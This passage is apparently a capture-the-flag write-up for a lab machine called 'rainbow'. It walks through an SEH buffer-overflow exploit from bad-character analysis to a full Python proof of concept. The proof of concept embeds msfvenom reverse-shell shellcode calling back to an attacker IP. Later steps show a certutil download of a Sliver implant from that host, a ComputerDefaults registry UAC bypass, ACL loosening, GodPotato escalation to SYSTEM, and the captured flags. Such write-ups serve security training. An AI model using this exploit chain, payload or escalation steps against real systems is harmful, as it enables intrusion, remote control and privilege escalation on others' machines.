This is a hard one to decipher, because of the way the rest of the badchars came back afterwards, and they were found way out of alignment.  But I think `\x0a` is a badchar.  So adding it.

Yes, that was correct.  All is well now
```sh
0:003> !exchain
00a1fbe4: 41414141
Invalid exception stack at 40404040
0:003> db 0x00a1fbe4 L0x256
00a1fbe4  40 40 40 40 41 41 41 41-01 02 03 04 05 06 07 08  @@@@AAAA........
00a1fbf4  09 0b 0c 0d 0e 0f 10 11-12 13 14 15 16 17 18 19  ................
00a1fc04  1a 1b 1c 1d 1e 1f 20 21-22 23 24 25 26 27 28 29  ...... !"#$%&'()
00a1fc14  2a 2b 2c 2d 2e 2f 30 31-32 33 34 35 36 37 38 39  *+,-./0123456789
00a1fc24  3a 3b 3c 3d 3e 3f 40 41-42 43 44 45 46 47 48 49  :;<=>?@ABCDEFGHI
00a1fc34  4a 4b 4c 4d 4e 4f 50 51-52 53 54 55 56 57 58 59  JKLMNOPQRSTUVWXY
00a1fc44  5a 5b 5c 5d 5e 5f 60 61-62 63 64 65 66 67 68 69  Z[\]^_`abcdefghi
00a1fc54  6a 6b 6c 6d 6e 6f 70 71-72 73 74 75 76 77 78 79  jklmnopqrstuvwxy
00a1fc64  7a 7b 7c 7d 7e 7f 80 81-82 83 84 85 86 87 88 89  z{|}~...........
00a1fc74  8a 8b 8c 8d 8e 8f 90 91-92 93 94 95 96 97 98 99  ................
00a1fc84  9a 9b 9c 9d 9e 9f a0 a1-a2 a3 a4 a5 a6 a7 a8 a9  ................
00a1fc94  aa ab ac ad ae af b0 b1-b2 b3 b4 b5 b6 b7 b8 b9  ................
00a1fca4  ba bb bc bd be bf c0 c1-c2 c3 c4 c5 c6 c7 c8 c9  ................
00a1fcb4  ca cb cc cd ce cf d0 d1-d2 d3 d4 d5 d6 d7 d8 d9  ................
00a1fcc4  da db dc dd de df e0 e1-e2 e3 e4 e5 e6 e7 e8 e9  ................
00a1fcd4  ea eb ec ed ee ef f0 f1-f2 f3 f4 f5 f6 f7 f8 f9  ................
00a1fce4  fa fb fc fd fe ff 42 42-42 42 42 42 42 42 42 42  ......BBBBBBBBBB
```

Final badcchars:
```python
badchars = "\x00\x0a"
```

Nothing uses the variable beyond hunting for badchars.


# Finding PopPopRet
Of note, only the rainbow binary will do.  Everything else has DEP and ASLR enabled, and, why fight them if you don't have to.
```sh
0:003> !load narly

      __s|I}*!{a.                        ._s,aan2*a
     _wY1+~-    )S,                     .ae"~=:...:X
   .vXl+:.       -4c                   <2+=|==::..:d
   vvi=;..        -?o,                =2=+==:::...=d
  )nv=:.            )5,              .2=--.......-=d
  ue+::              -*s             <c .        .=d
  m>==::..     ._,     <s,           )c           :d
  #==viii|===; {Xs=,    -{s          )c         ..:d
  Z;{nnonnvvii;v(-{%=.    ~s,        )e:====||iiv%=d
  X={oooonvvIl;3;  -{%,    -*>       )2<onnnnvnnnn>d
  X=)vvvvIliii:3;    -!s.   :)s.     )e<oonvlllllIid
  X=<lllliii|=:n;      -1c.  +|1,    )z<nvii||+|+|vX
  S=<lli|||=:: n;        "nc  -s%;   )c=ovl|++==+=vo
  X=<i||+=; . .n`          "1>.-{%i. )c<Xnnli||++=vn
  X=iii>==-.  :o`            "1,:+iI,)c:Sonnvli||=v(
  X>{ii+;:-  .u(               "o,-{Iw(:nvvvllii=v2
  S=i||;:. .=u(                 -!o,+I(:iiillii|ie`
  2>v|==__su?`                    -?o,-:==||iisv"
  {nvnI!""~                         -!sasvv}""`

             by Nephi Johnson (d0c_s4vage)
                      N for gnarly!

Available commands:

    !nmod     - display /SafeSEH, /GS, DEP, and ASLR info for
                all loaded modules

0:003> !nmod
00400000 00411000 rainbow              /SafeSEH OFF /GS            c:\rainbow\rainbow.exe
6f980000 6f995000 VCRUNTIME140         /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\VCRUNTIME140.dll
6f9a0000 6fa0d000 MSVCP140             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\MSVCP140.dll
74e80000 74e8f000 kernel_appcore       /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SysWOW64\kernel.appcore.dll
74fc0000 75012000 mswsock              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\mswsock.dll
753c0000 7547f000 msvcrt               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SysWOW64\msvcrt.dll
75f30000 75fe9000 RPCRT4               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\RPCRT4.dll
76b10000 76d49000 KERNELBASE           /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\KERNELBASE.dll
76f00000 77020000 ucrtbase             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\ucrtbase.dll
77050000 77140000 KERNEL32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\KERNEL32.DLL
774a0000 77503000 WS2_32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\WS2_32.dll
77550000 776f4000 ntdll                /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ntdll.dll

*DEP/*ASLR means that these modules are compatible with ASLR/DEP

```

Well with null byte being a bad character, and given the address space of the binary, that means the boundary for the buffer has to end after the third byte of SEH in order to get the address placed on the stack correctly, because the last byte of the address is always null.   The end of the string (zero-terminated) will have to be what places the null byte for the fourth and final byte.

Gadget hunt with a tool I built, that wraps around rp++. 

https://github.com/SYANiDE-/rp-ng

```sh

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/rainbow]
└─$ rp++-ng --va 0x00400000 --file dump/rainbow.exe -r 3 --regex "pop.*pop.*ret" 2>/dev/null

  rp++-ng?                           ^^           
            _________ _________      ___ __  __________ `
   .       |    _o___|    _o___ ++- |   \  |/   /_____/  !
          |___|\____|___|%%%%%     |____\_|\___\____.] 
  z        `BB' `BBB'`B'           `BBBBBBB' `BBBBBBBB' 
     ;                                    Chain faster
              [[                            $$$$$ $$$$$$      i
                    +                                    SYANiDE
        

0x4092ad: pop ecx ; pop ebp ; ret ; 
0x4094d8: pop ecx ; pop ecx ; ret ; 
0x409adc: pop edi ; pop esi ; pop ebx ; ret ; 
0x409b08: pop edi ; pop esi ; pop ebx ; ret ; 
0x4091b7: pop edi ; pop esi ; ret ; 
0x409add: pop esi ; pop ebx ; ret ; 
0x409b09: pop esi ; pop ebx ; ret ; 
```

probably this one
```
0x4094d8: pop ecx ; pop ecx ; ret ; 
```

Removing the tail simplifies the buffer
```python
    total_len = 3908
    crash_len = 664
    head = "POST / HTTP/1.1\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0a\x0d\x0a"
    sled1 = ("\x40" * crash_len)
    SEH = "\xd8\x94\x40"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; 
    buf = f"{head}{sled1}{SEH}"
```

New breakpoint; break on pop pop ret.
```sh
((cmd.exe /c "taskkill /F /IM rainbow.exe" && timeout 3 && START /B "" "c:\rainbow\rainbow.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "c:\rainbow\rainbow.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn rainbow.exe -c 'bp 0x4094d8; g'
```

Crash
```sh
0:003> !exchain
009ff8e4: rainbow+a040 (0040a040)
009ff924: rainbow+a040 (0040a040)
009ffbe4: rainbow+94d8 (004094d8)
Invalid exception stack at 40404040
0:003> t
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=004094d8 edx=775d9280 esi=00000000 edi=00000000
eip=004094d8 esp=009ff310 ebp=009ff330 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
rainbow+0x94d8:
004094d8 59              pop     ecx
0:003> t
eax=00000000 ebx=00000000 ecx=775d9262 edx=775d9280 esi=00000000 edi=00000000
eip=004094d9 esp=009ff314 ebp=009ff330 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
rainbow+0x94d9:
004094d9 59              pop     ecx
0:003> t
eax=00000000 ebx=00000000 ecx=009ff414 edx=775d9280 esi=00000000 edi=00000000
eip=004094da esp=009ff318 ebp=009ff330 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
rainbow+0x94da:
004094da c3              ret
0:003> dd esp L1
009ff318  009ffbe4
0:003> dd 0x009ffbe4 L10
009ffbe4  40404040 004094d8 00000005 009ffef0
009ffbf4  004026b3 00546058 005460e8 005460e8
009ffc04  009ffe74 0019eca8 0040b5a0 005460a8
009ffc14  00000000 00000000 0040b55c 005464d0
```

Very nice, ret will return to the 0x40404040.  


# To SEH or nSEH, that is the question
Not much of a question

Need a small kickback, maybe 0x8 bytes.
```sh
nasm > jmp short 0xf8
00000000  EBF6              jmp short 0xfffffff8
```

```sh
    total_len = 3908
    crash_len = 664-4
    head = "POST / HTTP/1.1\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0a\x0d\x0a"
    sled1 = ("\x40" * crash_len)
    nSEH = "\x90\x90\xeb\xf0"  ## nasm > jmp short 0xf2 / EBF0 jmp short 0xfffffff2
    SEH = "\xd8\x94\x40"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; 
    buf = f"{head}{sled1}{nSEH}{SEH}"
```


Very nice... three dwords worth of space after the short jump.
```sh
0:003> dd eip
00a0fbd8  40404040 40404040 40404040 f0eb9090
```

At this time, the beginning of the usable range is about 648 bytes back
```sh
0:003> dd eip-0n648
00a0f950  40404040 40404040 40404040 40404040
00a0f960  40404040 40404040 40404040 40404040
```

registers
```sh
0:003> r
eax=00000000 ebx=00000000 ecx=00a0f414 edx=775d9280 esi=00000000 edi=00000000
eip=00a0fbd8 esp=00a0f31c ebp=00a0f330 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
```

Need to add about 0x648 hex to esp and jump there. But need to do it in a way that avoids null bytes.  In python:

```python
>>> hex(0x964-0x31c)
'0x648'

>>> hex(0x00a3f31c + 0xfffff648)
'0x100a3e964'
```

Not quite right though, it's about 0x1000 off.

So instead it would make more sense to just write directly to the lower half of the dword.   Something like:
```
mov sp,0xf952; jmp esp
```

The following should align, with a placeholder for shellcode
```python
    crash_len = 664-4-12
    head = "POST / HTTP/1.1\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0a\x0d\x0a"
    sled1 = ("\x90" * 0x14)
    shellcode = ("\x41" * (crash_len - len(sled1)))
    nnSEH = (
        "\x66\xbc\x52\xf9"  ## mov sp, 0xf952
        "\xff\xe4"              ## jmp esp
        "\x90\x90\x90\x90\x90\x90"
    ) 
    nSEH = "\x90\x90\xeb\xf0"  ## nasm > jmp short 0xf2 / EBF0 jmp short 0xfffffff2
    SEH = "\xd8\x94\x40"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; 

    buf = f"{head}{sled1}{shellcode}{nnSEH}{nSEH}{SEH}"
```

After jmp esp, Perfect.  Land right at the beginning of `sled1`
```sh
0:003> dd eip
009ef950  90909090 90909090 90909090 90909090
009ef960  90909090 41414141 41414141 41414141
009ef970  41414141 41414141 41414141 41414141
009ef980  41414141 41414141 41414141 41414141
009ef990  41414141 41414141 41414141 41414141
```


# Shellcode
The only thing left to do is generate the shellcode and complete the PoC.
```python
#!/usr/bin/env python3
import os, sys, re, socket, binascii, time
from struct import pack, unpack

badchars = "\x00\x0a"
def gen_badchars(bc, start="\x01", end="\xff"):
	s_int = ord(start)
	e_int = ord(end)+1
	BC = bytearray(range(s_int,e_int)).decode('latin-1')
	for item in bc:
		BC = BC.replace(item,'')
	return BC

def cx(ip, port, recv=0):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    if recv > 0:
        resp = sock.recv(4096)
        print(resp)
    return sock

def sender(sock, buf, send=0, recv=0):
    if send > 0:
        sock.send(buf.encode('latin-1'))
    if recv > 0:
        resp = sock.recv(4096)
        return resp

def main():
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} ip:port")
        sys.exit()
    else:
        ip, port = sys.argv[1].split(":")
        port = int(port)
        sock = cx(ip,port,0)

    crash_len = 664-4-12
    head = "POST / HTTP/1.1\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0a\x0d\x0a"
    sled1 = ("\x90" * 0x14)
    shellcode = (
        ## msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.204 LPORT=443 EXITFUNC=thread -b "\x00\x0a" -f c
        "\xba\x92\xee\x4a\x91\xda\xcb\xd9\x74\x24\xf4\x58\x2b\xc9"
        "\xb1\x52\x31\x50\x12\x83\xe8\xfc\x03\xc2\xe0\xa8\x64\x1e"
        "\x14\xae\x87\xde\xe5\xcf\x0e\x3b\xd4\xcf\x75\x48\x47\xe0"
        "\xfe\x1c\x64\x8b\x53\xb4\xff\xf9\x7b\xbb\x48\xb7\x5d\xf2"
        "\x49\xe4\x9e\x95\xc9\xf7\xf2\x75\xf3\x37\x07\x74\x34\x25"
        "\xea\x24\xed\x21\x59\xd8\x9a\x7c\x62\x53\xd0\x91\xe2\x80"
        "\xa1\x90\xc3\x17\xb9\xca\xc3\x96\x6e\x67\x4a\x80\x73\x42"
        "\x04\x3b\x47\x38\x97\xed\x99\xc1\x34\xd0\x15\x30\x44\x15"
        "\x91\xab\x33\x6f\xe1\x56\x44\xb4\x9b\x8c\xc1\x2e\x3b\x46"
        "\x71\x8a\xbd\x8b\xe4\x59\xb1\x60\x62\x05\xd6\x77\xa7\x3e"
        "\xe2\xfc\x46\x90\x62\x46\x6d\x34\x2e\x1c\x0c\x6d\x8a\xf3"
        "\x31\x6d\x75\xab\x97\xe6\x98\xb8\xa5\xa5\xf4\x0d\x84\x55"
        "\x05\x1a\x9f\x26\x37\x85\x0b\xa0\x7b\x4e\x92\x37\x7b\x65"
        "\x62\xa7\x82\x86\x93\xee\x40\xd2\xc3\x98\x61\x5b\x88\x58"
        "\x8d\x8e\x1f\x08\x21\x61\xe0\xf8\x81\xd1\x88\x12\x0e\x0d"
        "\xa8\x1d\xc4\x26\x43\xe4\x8f\x42\x9e\xe8\x83\x3b\x9c\xf4"
        "\x1a\x07\x29\x12\x76\x67\x7c\x8d\xef\x1e\x25\x45\x91\xdf"
        "\xf3\x20\x91\x54\xf0\xd5\x5c\x9d\x7d\xc5\x09\x6d\xc8\xb7"
        "\x9c\x72\xe6\xdf\x43\xe0\x6d\x1f\x0d\x19\x3a\x48\x5a\xef"
        "\x33\x1c\x76\x56\xea\x02\x8b\x0e\xd5\x86\x50\xf3\xd8\x07"
        "\x14\x4f\xff\x17\xe0\x50\xbb\x43\xbc\x06\x15\x3d\x7a\xf1"
        "\xd7\x97\xd4\xae\xb1\x7f\xa0\x9c\x01\xf9\xad\xc8\xf7\xe5"
        "\x1c\xa5\x41\x1a\x90\x21\x46\x63\xcc\xd1\xa9\xbe\x54\xf1"
        "\x4b\x6a\xa1\x9a\xd5\xff\x08\xc7\xe5\x2a\x4e\xfe\x65\xde"
        "\x2f\x05\x75\xab\x2a\x41\x31\x40\x47\xda\xd4\x66\xf4\xdb"
        "\xfc"## 351
    )
    sled2 = ("\x41" * (crash_len - len(sled1) - len(shellcode)))
    nnSEH = (
        "\x66\xbc\x50\xf9"  ## mov sp, 0xf950
        "\xff\xe4"              ## jmp esp
        "\x90\x90\x90\x90\x90\x90"
    ) 
    nSEH = "\x90\x90\xeb\xf0"  ## nasm > jmp short 0xf2 / EBF0 jmp short 0xfffffff2
    SEH = "\xd8\x94\x40"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; 

    buf = f"{head}{sled1}{shellcode}{sled2}{nnSEH}{nSEH}{SEH}"
    resp = sender(sock, buf, 1, 1)


if __name__=="__main__":
    main()
```

# Getting a foothold

It shells:

![[Pasted_image_20251026063455.png]]

Flag
```sh
C:\Users\rainbow\Desktop>type user.txt
type user.txt
881288e2cd563fa856fcb4163b91ec06
```


# Post-exploitation enumeration

Need to upgrade my shell to something a little more feature rich, reliable, etc.

Download  a Sliver implant to the host
```sh
C:\rainbow>certutil -urlcache -f -split http://10.10.14.204:8083/10.10.14.204.exe \windows\tasks\a.exe
certutil -urlcache -f -split http://10.10.14.204:8083/10.10.14.204.exe \windows\tasks\a.exe
****  Online  ****
  000000  ...
  988a00
CertUtil: -URLCache command completed successfully.
```

The current shell env is 32 bit (of course), but the system is 64bit
```sh
C:\rainbow>set proc
set proc
PROCESSOR_ARCHITECTURE=x86
PROCESSOR_ARCHITEW6432=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
PROCESSOR_LEVEL=25
PROCESSOR_REVISION=0101
```

So I will use 64bit cmd.exe to launch the sliver implant.
```sh
C:\rainbow>c:\windows\sysnative\cmd.exe /c \windows\tasks\a.exe
c:\windows\sysnative\cmd.exe /c \windows\tasks\a.exe
```

Sharpup audit, found that UAC can be bypassed.
```sh
sliver (REMOTE_JACKAL) > sharpup -t 300 -i -- audit

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

[*] In medium integrity but user is a local administrator- UAC can be bypassed.

[*] Audit mode: running an additional 15 check(s).
Registry AutoLogon Found

[!] Modifialbe scheduled tasks were not evaluated due to permissions.

=== Registry AutoLogons ===
```


# Elevate 
I'll try a number of UAC bypasses.  What I found worked for me is the ComputerDefaults bypass.

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c \windows\tasks\a.exe" -Force

\#\# Then execute with:  ComputerDefaults.exe (triggers based on the same registry key.  Full path pops defender, try running without full path)
c:\Windows\System32\ComputerDefaults.exe
```

I get a new session:
```sh
[*] Session e7b84ea7 REMOTE_JACKAL - 10.129.35.177:63623 (rainbow) - windows/amd64 - Sun, 26 Oct 2025 17:02:15 PDT

sliver (REMOTE_JACKAL) >
```

I'll clean up the registry
```powershell
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```


# Escalate

On the new session, I find that the process integrity is High, and the process tokens include SeImpersonatePrivilege in an enabled state

![[Pasted_image_20251026171700.png]]

Upload GodPotato
```sh
sliver (REMOTE_JACKAL) > upload /var/www/html/GodPotato-NET4.exe /windows/tasks/GodPotato.exe

[*] Wrote file to C:\windows\tasks\GodPotato.exe
```

Loosen DACLs around files in `c:\windows\tasks`
```sh
$path="c:\windows\tasks"; (Get-ChildItem -path $path\* -Recurse).FullName | % {$Acl = Get-ACL $_; $AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","none","none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $_ $Acl}
```

Execute GodPotato, have it daemonize another instance of the Sliver implant
```powershell
PS C:\windows\tasks> .\GodPotato.exe -cmd "cmd.exe /c \windows\tasks\a.exe"
.\GodPotato.exe -cmd "cmd.exe /c \windows\tasks\a.exe"
[*] CombaseModule: 0x140709195350016
[*] DispatchTable: 0x140709197652048
[*] UseProtseqFunction: 0x140709197029744
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\aabfbcee-7777-4b84-bb35-19b7430af1b9\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00000802-16c8-ffff-1d75-8eaf76328c8b
[*] DCOM obj OXID: 0x48fca28fb7e0a860
[*] DCOM obj OID: 0xdc03a523a80cc5fc
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 908 Token:0x844  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 6848
```

A new session is born
```sh
sliver (REMOTE_JACKAL) > use aff2989a-17bd-4cce-a0ea-6c3c1188e23e

[*] Active session REMOTE_JACKAL (aff2989a-17bd-4cce-a0ea-6c3c1188e23e)

sliver (REMOTE_JACKAL) > getuid

S-1-5-18

sliver (REMOTE_JACKAL) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Current Token ID: NT AUTHORITY\SYSTEM

```

Root flag
```sh
sliver (REMOTE_JACKAL) > cat /users/administrator/desktop/root.txt

4f5858163e52fd36d6cb7c6074c50a40
```


![[Pasted_image_20251026172423.png]]